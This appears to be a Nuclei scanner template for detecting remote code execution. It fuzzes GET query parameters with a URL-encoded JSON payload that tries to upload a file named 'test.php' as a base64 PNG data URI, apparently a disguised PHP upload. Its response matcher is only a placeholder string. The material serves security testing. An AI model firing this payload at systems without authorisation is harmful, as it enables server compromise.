id: fuzz-rce-custom

info:
  name: Custom RCE Payload Detection
  author: netbaan
  severity: critical
  description: |
    This template is designed to detect potential Remote Code Execution vulnerabilities using a specific payload.

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'  # Run only on GET requests

    payloads:
      rce:
        - "%7B%22name%22%3A%22test.php%22%2C%22data%22%3A%22data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAIAAAD8GO2jAAAAVklEQVR4nGNcPD89JF9HRVRbMF0oJF9QT1NUWzFdKTs%2FPljAc143k%2FyPi9t%2BX9N9qif38ePJv1%2FvBnyyMFiXHMwwCkbBKBgFo2AUjIJRMApGwSgYfgAAI0oXArodV7QAAAAASUVORK5CYII%3D%22%7D"

    stop-at-first-match: true

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{rce}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "command executed"  # Example match string, adjust according to the application response

      - type: status
        status:
          - 200  # Expect a 200 OK response if execution was successful